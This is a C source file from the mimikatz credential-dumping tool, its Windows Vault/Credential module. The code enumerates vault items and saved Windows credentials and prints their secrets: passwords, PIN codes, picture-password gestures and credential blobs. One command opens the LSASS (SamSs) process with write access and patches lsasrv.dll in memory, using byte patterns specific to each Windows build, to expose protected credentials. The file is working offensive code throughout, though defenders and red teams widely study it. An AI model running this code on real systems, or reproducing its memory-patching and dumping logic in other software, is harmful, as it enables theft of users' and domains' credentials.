/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_vault.h"

HMODULE hVaultCli = NULL;
PVAULTENUMERATEITEMTYPES VaultEnumerateItemTypes = NULL;
PVAULTENUMERATEVAULTS VaultEnumerateVaults = NULL;
PVAULTOPENVAULT VaultOpenVault = NULL;
PVAULTGETINFORMATION VaultGetInformation = NULL;
PVAULTENUMERATEITEMS VaultEnumerateItems = NULL;
PVAULTCLOSEVAULT VaultCloseVault = NULL;
PVAULTFREE VaultFree = NULL;
PVAULTGETITEM7 VaultGetItem7 = NULL;
PVAULTGETITEM8 VaultGetItem8 = NULL;

BOOL isVaultInit = FALSE;
DWORD sizeOfStruct;

const KUHL_M_C kuhl_m_c_vault[] = {
	{kuhl_m_vault_list,	L"list",	L"list"},
	{kuhl_m_vault_cred,	L"cred",	L"cred"},
};
const KUHL_M kuhl_m_vault = {
	L"vault",	L"Windows Vault/Credential module", NULL,
	ARRAYSIZE(kuhl_m_c_vault), kuhl_m_c_vault, kuhl_m_vault_init, kuhl_m_vault_clean
};

NTSTATUS kuhl_m_vault_init()
{
	if(hVaultCli = LoadLibrary(L"vaultcli"))
	{
		VaultEnumerateItemTypes = (PVAULTENUMERATEITEMTYPES) GetProcAddress(hVaultCli, "VaultEnumerateItemTypes");
		VaultEnumerateVaults = (PVAULTENUMERATEVAULTS) GetProcAddress(hVaultCli, "VaultEnumerateVaults");
		VaultOpenVault = (PVAULTOPENVAULT) GetProcAddress(hVaultCli, "VaultOpenVault");
		VaultGetInformation = (PVAULTGETINFORMATION) GetProcAddress(hVaultCli, "VaultGetInformation");
		VaultEnumerateItems = (PVAULTENUMERATEITEMS) GetProcAddress(hVaultCli, "VaultEnumerateItems");
		VaultCloseVault = (PVAULTCLOSEVAULT) GetProcAddress(hVaultCli, "VaultCloseVault");
		VaultFree = (PVAULTFREE) GetProcAddress(hVaultCli, "VaultFree");
		VaultGetItem7 = (PVAULTGETITEM7) GetProcAddress(hVaultCli, "VaultGetItem");
		VaultGetItem8 = (PVAULTGETITEM8) VaultGetItem7;

		isVaultInit = VaultEnumerateItemTypes && VaultEnumerateVaults && VaultOpenVault && VaultGetInformation && VaultEnumerateItems && VaultCloseVault && VaultFree && VaultGetItem7;
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_vault_clean()
{
	if(hVaultCli)
		FreeLibrary(hVaultCli);
	return STATUS_SUCCESS;
}

const VAULT_SCHEMA_HELPER schemaHelper[] = {
	{{{0x3e0e35be, 0x1b77, 0x43e7, {0xb8, 0x73, 0xae, 0xd9, 0x01, 0xb6, 0x27, 0x5b}}, L"Domain Password"},		NULL},
	{{{0xe69d7838, 0x91b5, 0x4fc9, {0x89, 0xd5, 0x23, 0x0d, 0x4d, 0x4c, 0xc2, 0xbc}}, L"Domain Certificate"},	NULL},
	{{{0x3c886ff3, 0x2669, 0x4aa2, {0xa8, 0xfb, 0x3f, 0x67, 0x59, 0xa7, 0x75, 0x48}}, L"Domain Extended"},		NULL},
	{{{0xb2e033f5, 0x5fde, 0x450d, {0xa1, 0xbd, 0x37, 0x91, 0xf4, 0x65, 0x72, 0x0c}}, L"Pin Logon"},			kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric},
	{{{0xb4b8a12b, 0x183d, 0x4908, {0x95, 0x59, 0xbd, 0x8b, 0xce, 0x72, 0xb5, 0x8a}}, L"Picture Password"},	kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric},
	{{{0xfec87291, 0x14f6, 0x40b6, {0xbd, 0x98, 0x7f, 0xf2, 0x45, 0x98, 0x6b, 0x26}}, L"Biometric"},			kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric},
	{{{0x1d4350a3, 0x330d, 0x4af9, {0xb3, 0xff, 0xa9, 0x27, 0xa4, 0x59, 0x98, 0xac}}, L"Next Generation Credential"},	NULL},
};

NTSTATUS kuhl_m_vault_list(int argc, wchar_t * argv[])
{
	DWORD i, j, k, l, cbVaults, cbItems;
	LPGUID vaults;
	HANDLE hVault;
	PVOID items;
	PVAULT_ITEM_7 items7, pItem7;
	PVAULT_ITEM_8 items8, pItem8;
	NTSTATUS status;
	BOOL isAttr = kull_m_string_args_byName(argc, argv, L"attributes", NULL, NULL);

	if(isVaultInit)
	{
		status = VaultEnumerateVaults(0, &cbVaults, &vaults);
		if(status == STATUS_SUCCESS)
		{
			for(i = 0; i < cbVaults; i++)
			{
				kprintf(L"\nVault : "); kull_m_string_displayGUID(&vaults[i]); kprintf(L"\n");

				if(NT_SUCCESS(VaultOpenVault(&vaults[i], 0, &hVault)))
				{
					kuhl_m_vault_list_descVault(hVault);

					if(NT_SUCCESS(VaultEnumerateItems(hVault, 0x200, &cbItems, &items))) // for all :)
					{
						kprintf(L"\tItems (%u)\n", cbItems);
						for(j = 0; j < cbItems; j++)
						{
							if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) // to fix !
							{
								items7 = (PVAULT_ITEM_7) items;
								kprintf(L"\t %2u.\t%s\n", j, items7[j].FriendlyName);
								kprintf(L"\t\tType            : "); kull_m_string_displayGUID(&items7[j].SchemaId); kprintf(L"\n");
								kprintf(L"\t\tLastWritten     : "); kull_m_string_displayLocalFileTime(&items7[j].LastWritten); kprintf(L"\n");
								kprintf(L"\t\tFlags           : %08x\n", items7[j].Flags);

								kprintf(L"\t\tRessource       : "); kuhl_m_vault_list_descItemData(items7[j].Ressource); kprintf(L"\n");
								kprintf(L"\t\tIdentity        : "); kuhl_m_vault_list_descItemData(items7[j].Identity); kprintf(L"\n");
								kprintf(L"\t\tAuthenticator   : "); kuhl_m_vault_list_descItemData(items7[j].Authenticator); kprintf(L"\n");

								if(isAttr)
								{
									for(k = 0; k < items7[j].cbProperties; k++)
									{
										kprintf(L"\t\tProperty %2u     : ", k); kuhl_m_vault_list_descItemData(items7[j].Properties + k); kprintf(L"\n");
									}
								}
								pItem7 = NULL;
								status = VaultGetItem7(hVault, &items7[j].SchemaId, items7[j].Ressource, items7[j].Identity, NULL, 0, &pItem7);

								kprintf(L"\t\t*Authenticator* : ");
								if(status == STATUS_SUCCESS)
									kuhl_m_vault_list_descItemData(pItem7->Authenticator);
								else
									PRINT_ERROR(L"VaultGetItem7 : %08x", status);
								kprintf(L"\n");
								;
							}
							else
							{
								items8 = (PVAULT_ITEM_8) items;

								kprintf(L"\t %2u.\t%s\n", j, items8[j].FriendlyName);
								kprintf(L"\t\tType            : "); kull_m_string_displayGUID(&items8[j].SchemaId); kprintf(L"\n");
								kprintf(L"\t\tLastWritten     : "); kull_m_string_displayLocalFileTime(&items8[j].LastWritten); kprintf(L"\n");
								kprintf(L"\t\tFlags           : %08x\n", items8[j].Flags);

								kprintf(L"\t\tRessource       : "); kuhl_m_vault_list_descItemData(items8[j].Ressource); kprintf(L"\n");
								kprintf(L"\t\tIdentity        : "); kuhl_m_vault_list_descItemData(items8[j].Identity); kprintf(L"\n");
								kprintf(L"\t\tAuthenticator   : "); kuhl_m_vault_list_descItemData(items8[j].Authenticator); kprintf(L"\n");
								kprintf(L"\t\tPackageSid      : "); kuhl_m_vault_list_descItemData(items8[j].PackageSid); kprintf(L"\n");

								if(isAttr)
								{
									for(k = 0; k < items8[j].cbProperties; k++)
									{
										kprintf(L"\t\tProperty %2u     : ", k); kuhl_m_vault_list_descItemData(items8[j].Properties + k); kprintf(L"\n");
									}
								}
								pItem8 = NULL;
								status = VaultGetItem8(hVault, &items8[j].SchemaId, items8[j].Ressource, items8[j].Identity, items8[j].PackageSid, NULL, 0, &pItem8);

								kprintf(L"\t\t*Authenticator* : ");
								if(status == STATUS_SUCCESS)
									kuhl_m_vault_list_descItemData(pItem8->Authenticator);
								else
									PRINT_ERROR(L"VaultGetItem8 : %08x", status);
								kprintf(L"\n");

								for(l = 0; l < ARRAYSIZE(schemaHelper); l++)
								{
									if(RtlEqualGuid(&items8[j].SchemaId, &schemaHelper[l].guidString.guid))
									{
										kprintf(L"\n\t\t*** %s ***\n", schemaHelper[l].guidString.text);
										if(schemaHelper[l].helper)
											schemaHelper[l].helper(&schemaHelper[l].guidString, &items8[j], ((status == STATUS_SUCCESS) && pItem8) ? pItem8 : NULL, TRUE);
										kprintf(L"\n");
										break;
									}
								}

								if(pItem8)
									VaultFree(pItem8);
							}
						}
						VaultFree(items);
					}
					VaultCloseVault(&hVault);
				}
			}
			VaultFree(vaults);
		}
		else PRINT_ERROR(L"VaultEnumerateVaults : 0x%08x\n", status);
	}
	return STATUS_SUCCESS;
}

void CALLBACK kuhl_m_vault_list_descItem_PINLogonOrPicturePasswordOrBiometric(const VAULT_GUID_STRING * pGuidString, PVOID enumItem, PVOID getItem, BOOL is8)
{
	PVAULT_ITEM_8 enumItem8 = (PVAULT_ITEM_8) enumItem, getItem8 = (PVAULT_ITEM_8) getItem;
	PWSTR name, domain, sid, bgPath = NULL;
	UNICODE_STRING uString;
	DWORD i, dwError, szNeeded;
	PVAULT_PICTURE_PASSWORD_ELEMENT pElements;
	PVAULT_BIOMETRIC_ELEMENT bElements;
	PWCHAR bufferStart;
	HKEY hPicturePassword, hUserPicturePassword;

	if(enumItem8->Identity && (enumItem8->Identity->Type == ElementType_ByteArray))
	{
		kprintf(L"\t\tUser            : ");
		if(kull_m_token_getNameDomainFromSID((PSID) enumItem8->Identity->data.ByteArray.Value, &name, &domain, NULL, NULL))
		{
			kprintf(L"%s\\%s", domain, name);
			LocalFree(name);
			LocalFree(domain);
		}
		else kull_m_string_displaySID((PSID) enumItem8->Identity->data.ByteArray.Value);
		kprintf(L"\n");

		if(pGuidString->guid.Data1 == 0x0b4b8a12b)
		{
			dwError = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\PicturePassword", 0, KEY_ENUMERATE_SUB_KEYS, &hPicturePassword);
			if(dwError == STATUS_SUCCESS)
			{
				if(ConvertSidToStringSid((PSID) enumItem8->Identity->data.ByteArray.Value, &sid))
				{
					dwError = RegOpenKeyEx(hPicturePassword, sid, 0, KEY_QUERY_VALUE, &hUserPicturePassword);
					if(dwError == STATUS_SUCCESS)
					{
						dwError = RegQueryValueEx(hUserPicturePassword, L"bgPath", NULL, NULL, NULL, &szNeeded);
						if(dwError == STATUS_SUCCESS)
						{
							if(bgPath = (PWSTR) LocalAlloc(LPTR, szNeeded))
							{
								dwError = RegQueryValueEx(hUserPicturePassword, L"bgPath", NULL, NULL, (LPBYTE) bgPath, &szNeeded);
								if(dwError != STATUS_SUCCESS)
								{
									PRINT_ERROR(L"RegQueryValueEx 2 : %08x\n", dwError);
									bgPath = (PWSTR) LocalFree(bgPath);
								}
							}
						}
						else PRINT_ERROR(L"RegQueryValueEx 1 : %08x\n", dwError);
						RegCloseKey(hUserPicturePassword);
					}
					else PRINT_ERROR(L"RegOpenKeyEx SID : %08x\n", dwError);
					LocalFree(sid);
				}
				else PRINT_ERROR_AUTO(L"ConvertSidToStringSid");
				RegCloseKey(hPicturePassword);
			}
			else PRINT_ERROR(L"RegOpenKeyEx PicturePassword : %08x\n", dwError);
		}
	}

	if(getItem8 && getItem8->Authenticator && (getItem8->Authenticator->Type == ElementType_ByteArray))
	{
		uString.Length = uString.MaximumLength = (USHORT) getItem8->Authenticator->data.ByteArray.Length;
		uString.Buffer = (PWSTR) getItem8->Authenticator->data.ByteArray.Value;
		kprintf(L"\t\tPassword        : ");
		if(kull_m_string_suspectUnicodeString(&uString))
			kprintf(L"%wZ", &uString);
		else 
			kull_m_string_wprintf_hex(uString.Buffer, uString.Length, 1);
		kprintf(L"\n");
	}

	if(enumItem8->Properties && (enumItem8->cbProperties > 0) && enumItem8->Properties + 0)
	{
		switch(pGuidString->guid.Data1)
		{
		case 0x0b2e033f5:	// pin
			if((enumItem8->Properties + 0)->Type == ElementType_UnsignedShort)
				kprintf(L"\t\tPIN Code        : %04hu\n", (enumItem8->Properties + 0)->data.UnsignedShort);
			break;
		case 0x0b4b8a12b:	// picture
			if((enumItem8->Properties + 0)->Type == ElementType_ByteArray)
			{
				pElements = (PVAULT_PICTURE_PASSWORD_ELEMENT) (enumItem8->Properties + 0)->data.ByteArray.Value;
				if(bgPath)
				{
					kprintf(L"\t\tBackground path : %s\n", bgPath);
					LocalFree(bgPath);
				}
				kprintf(L"\t\tPicture password (grid is 150*100)\n");

				for(i = 0; i < 3; i++)
				{
					kprintf(L"\t\t [%u] ", i);
					switch(pElements[i].Type)
					{
					case PP_Point:
						kprintf(L"point  (x = %3u ; y = %3u)", pElements[i].point.coord.x, pElements[i].point.coord.y);
						break;
					case PP_Circle:
						kprintf(L"circle (x = %3u ; y = %3u ; r = %3u) - %s", pElements[i].circle.coord.x, pElements[i].circle.coord.y, pElements[i].circle.size, (pElements[i].circle.clockwise ? L"clockwise" : L"anticlockwise"));
						break;
					case PP_Line:
						kprintf(L"line   (x = %3u ; y = %3u) -> (x = %3u ; y = %3u)", pElements[i].line.start.x, pElements[i].line.start.y, pElements[i].line.end.x, pElements[i].line.end.y);
						break;
					default:
						kprintf(L"%u\n", pElements[i].Type);
					}
					kprintf(L"\n");
				}
			}
			break;
		case 0x0fec87291:	// biometric
			if((enumItem8->Properties + 0)->Type == ElementType_ByteArray)
			{
				bElements = (PVAULT_BIOMETRIC_ELEMENT) (enumItem8->Properties + 0)->data.ByteArray.Value;
				bufferStart = (PWCHAR) ((PBYTE) bElements + bElements->headersize);
				kprintf(L"\t\tProperty        : ");
				if(bElements->domainnameLength > 1)
					kprintf(L"%.*s\\", bElements->domainnameLength - 1, bufferStart + bElements->usernameLength);
				if(bElements->usernameLength > 1)
					kprintf(L"%.*s", bElements->usernameLength - 1, bufferStart);
				kprintf(L"\n");
			}
			break;
		default:
			kprintf(L"todo ?\n");
		}
	}
}

void kuhl_m_vault_list_descVault(HANDLE hVault)
{
	VAULT_INFORMATION information;
	RtlZeroMemory(&information, sizeof(VAULT_INFORMATION));
	information.type = VaultInformation_Name;
	if(NT_SUCCESS(VaultGetInformation(hVault, 0, &information)))
	{
		kprintf(L"\tName       : %s\n", information.string);
		VaultFree(information.string);
	}
	RtlZeroMemory(&information, sizeof(VAULT_INFORMATION));
	information.type = (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) ? VaultInformation_Path_7 : VaultInformation_Path_8;
	if(NT_SUCCESS(VaultGetInformation(hVault, 0, &information)))
	{
		kprintf(L"\tPath       : %s\n", information.string ? information.string : L"temp vault");
		VaultFree(information.string);
	}
}

void kuhl_m_vault_list_descItemData(PVAULT_ITEM_DATA pData)
{
	if(pData)
	{
		
		switch(pData->Type)
		{
		case ElementType_UnsignedShort:
			kprintf(L"[USHORT] %hu", pData->data.UnsignedShort);
			break;
		case ElementType_UnsignedInteger:
			kprintf(L"[DWORD] %u", pData->data.UnsignedInt);
			break;
		case ElementType_String:
			kprintf(L"[STRING] %s", pData->data.String);
			break;
		case ElementType_ByteArray:
			kprintf(L"[BYTE*] ");
			kull_m_string_wprintf_hex(pData->data.ByteArray.Value, pData->data.ByteArray.Length, 1);
			break;
		case ElementType_Sid:
			kprintf(L"[SID] ");
			kull_m_string_displaySID(pData->data.Sid);
			break;
		case ElementType_Attribute:
			kprintf(L"[ATTRIBUTE]\n");
			kprintf(L"\t\t  Flags   : %08x - %u\n", pData->data.Attribute->Flags, pData->data.Attribute->Flags);
			kprintf(L"\t\t  Keyword : %s\n", pData->data.Attribute->Keyword);
			kprintf(L"\t\t  Value   : ");
			kull_m_string_printSuspectUnicodeString(pData->data.Attribute->Value, pData->data.Attribute->ValueSize);
			break;
		default:
			kprintf(L"[Type %2u] ", pData->Type);
			kull_m_string_wprintf_hex(&pData->data, 4, 1);
		}
	}
}

#ifdef _M_X64
BYTE PTRN_WNT5_CredpCloneCredential[]			= {0x8b, 0x47, 0x04, 0x83, 0xf8, 0x01, 0x0f, 0x84};
BYTE PTRN_WN60_CredpCloneCredential[]			= {0x44, 0x8b, 0xea, 0x41, 0x83, 0xe5, 0x01, 0x75};
BYTE PTRN_WN62_CredpCloneCredential[]			= {0x44, 0x8b, 0xfa, 0x41, 0x83, 0xe7, 0x01, 0x75};
BYTE PTRN_WN63_CredpCloneCredential[]			= {0x45, 0x8b, 0xf8, 0x44, 0x23, 0xfa};
BYTE PTRN_WN10_1607_CredpCloneCredential[]		= {0x45, 0x8b, 0xe0, 0x41, 0x83, 0xe4, 0x01, 0x75};
BYTE PTRN_WN10_1703_CredpCloneCredential[]		= {0x45, 0x8b, 0xe6, 0x41, 0x83, 0xe4, 0x01, 0x75};
BYTE PTRN_WN10_1803_CredpCloneCredential[]		= {0x45, 0x8b, 0xfe, 0x41, 0x83, 0xe7, 0x01, 0x75};
BYTE PTRN_WN10_1809_CredpCloneCredential[]		= {0x45, 0x8b, 0xe6, 0x41, 0x83, 0xe4, 0x01, 0x0f, 0x84};
BYTE PATC_WNT5_CredpCloneCredentialJmpShort[]	= {0x90, 0xe9};
BYTE PATC_WALL_CredpCloneCredentialJmpShort[]	= {0xeb};
BYTE PATC_WN64_CredpCloneCredentialJmpShort[]	= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
KULL_M_PATCH_GENERIC CredpCloneCredentialReferences[] = {
	{KULL_M_WIN_BUILD_2K3,	{sizeof(PTRN_WNT5_CredpCloneCredential),	PTRN_WNT5_CredpCloneCredential},	{sizeof(PATC_WNT5_CredpCloneCredentialJmpShort),	PATC_WNT5_CredpCloneCredentialJmpShort},	{6}},
	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WN60_CredpCloneCredential),	PTRN_WN60_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WN62_CredpCloneCredential),	PTRN_WN62_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
	{KULL_M_WIN_BUILD_BLUE,	{sizeof(PTRN_WN63_CredpCloneCredential),	PTRN_WN63_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{6}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN63_CredpCloneCredential),	PTRN_WN63_CredpCloneCredential},	{sizeof(PATC_WN64_CredpCloneCredentialJmpShort),	PATC_WN64_CredpCloneCredentialJmpShort},	{6}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_CredpCloneCredential),	PTRN_WN10_1607_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN10_1703_CredpCloneCredential),	PTRN_WN10_1703_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN10_1803_CredpCloneCredential),	PTRN_WN10_1803_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_1809_CredpCloneCredential),	PTRN_WN10_1809_CredpCloneCredential},	{sizeof(PATC_WN64_CredpCloneCredentialJmpShort),	PATC_WN64_CredpCloneCredentialJmpShort},	{7}},
};
#elif defined _M_IX86
BYTE PTRN_WNT5_CredpCloneCredential[]			= {0x8b, 0x43, 0x04, 0x83, 0xf8, 0x01, 0x74};
BYTE PTRN_WN60_CredpCloneCredential[]			= {0x89, 0x4d, 0x18, 0x83, 0x65, 0x18, 0x01, 0x75};
BYTE PTRN_WN62_CredpCloneCredential[]			= {0x75, 0x1e, 0x83, 0x7f, 0x04, 0x02, 0x0f, 0x84};
BYTE PTRN_WN64_CredpCloneCredential[]			= {0x75, 0x17, 0x83, 0x7f, 0x04, 0x02, 0x74};
BYTE PTRN_WN10_1703_CredpCloneCredential[]		= {0x75, 0x1e, 0x8b, 0x47, 0x04, 0x83, 0xf8, 0x02, 0x0f, 0x84};
BYTE PATC_WALL_CredpCloneCredentialJmpShort[]	= {0xeb};
KULL_M_PATCH_GENERIC CredpCloneCredentialReferences[] = {
	{KULL_M_WIN_BUILD_XP,	{sizeof(PTRN_WNT5_CredpCloneCredential),	PTRN_WNT5_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{6}},
	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WN60_CredpCloneCredential),	PTRN_WN60_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{7}},
	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WN62_CredpCloneCredential),	PTRN_WN62_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN64_CredpCloneCredential),	PTRN_WN64_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN10_1703_CredpCloneCredential),	PTRN_WN10_1703_CredpCloneCredential},	{sizeof(PATC_WALL_CredpCloneCredentialJmpShort),	PATC_WALL_CredpCloneCredentialJmpShort},	{0}},
};
#endif

NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
{
	DWORD credCount, i, j;
	PCREDENTIAL * pCredential = NULL;
	DWORD flags = 0;
	SERVICE_STATUS_PROCESS ServiceStatusProcess;
	PKULL_M_MEMORY_HANDLE hMemory;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleSamSrv;
	HANDLE hSamSs;
	KULL_M_MEMORY_ADDRESS aPatternMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aPatchMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory;
	PKULL_M_PATCH_GENERIC CredpCloneCredentialReference;
	
	static BOOL isPatching = FALSE;	
	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
	{
		if(CredpCloneCredentialReference = kull_m_patch_getGenericFromBuild(CredpCloneCredentialReferences, ARRAYSIZE(CredpCloneCredentialReferences), MIMIKATZ_NT_BUILD_NUMBER))
		{
			aPatternMemory.address = CredpCloneCredentialReference->Search.Pattern;
			aPatchMemory.address = CredpCloneCredentialReference->Patch.Pattern;
			if(kull_m_service_getUniqueForName(L"SamSs", &ServiceStatusProcess))
			{
				if(hSamSs = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, ServiceStatusProcess.dwProcessId))
				{
					if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hSamSs, &hMemory))
					{
						if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, L"lsasrv.dll", &iModuleSamSrv))
						{
							sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModuleSamSrv.DllBase;
							sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
							isPatching = TRUE;
							if(!kull_m_patch(&sMemory, &aPatternMemory, CredpCloneCredentialReference->Search.Length, &aPatchMemory, CredpCloneCredentialReference->Patch.Length, CredpCloneCredentialReference->Offsets.off0, kuhl_m_vault_cred, argc, argv, NULL))
								PRINT_ERROR_AUTO(L"kull_m_patch");
							isPatching = FALSE;
						} else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
						kull_m_memory_close(hMemory);
					}
				} else PRINT_ERROR_AUTO(L"OpenProcess");
			} else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
		}
	}
	else
	{
		do
		{
			if(CredEnumerate(NULL, flags, &credCount, &pCredential))
			{
				for(i = 0; i < credCount; i++)
				{
					kprintf(L"TargetName : %s / %s\n"
						L"UserName   : %s\n"
						L"Comment    : %s\n"
						L"Type       : %u - %s\n"
						L"Persist    : %u - %s\n"
						L"Flags      : %08x\n",
						pCredential[i]->TargetName ? pCredential[i]->TargetName : L"<NULL>",  pCredential[i]->TargetAlias ? pCredential[i]->TargetAlias : L"<NULL>",
						pCredential[i]->UserName ? pCredential[i]->UserName : L"<NULL>",
						pCredential[i]->Comment ? pCredential[i]->Comment : L"<NULL>",
						pCredential[i]->Type, kull_m_cred_CredType(pCredential[i]->Type),
						pCredential[i]->Persist, kull_m_cred_CredPersist(pCredential[i]->Persist),
						pCredential[i]->Flags
						);
					kprintf(L"Credential : ");
					kull_m_string_printSuspectUnicodeString(pCredential[i]->CredentialBlob, pCredential[i]->CredentialBlobSize);
					kprintf(L"\n"
						L"Attributes : %u\n", pCredential[i]->AttributeCount
						);
					if(kull_m_string_args_byName(argc, argv, L"attributes", NULL, NULL))
					{
						for(j = 0; j < pCredential[i]->AttributeCount; j++)
						{
							kprintf(L" [%2u] Attribute\n", j);
							kprintf(L"  Flags   : %08x - %u\n", pCredential[i]->Attributes[j].Flags, pCredential[i]->Attributes[j].Flags);
							kprintf(L"  Keyword : %s\n", pCredential[i]->Attributes[j].Keyword);
							kprintf(L"  Value   : ");
							kull_m_string_printSuspectUnicodeString(pCredential[i]->Attributes[j].Value, pCredential[i]->Attributes[j].ValueSize);
							kprintf(L"\n");
						}
					}
					kprintf(L"\n");
				}
				CredFree(pCredential);
			}
			flags++;
		} while((flags <= CRED_ENUMERATE_ALL_CREDENTIALS) && (MIMIKATZ_NT_MAJOR_VERSION > 5));
	}
	return STATUS_SUCCESS;
}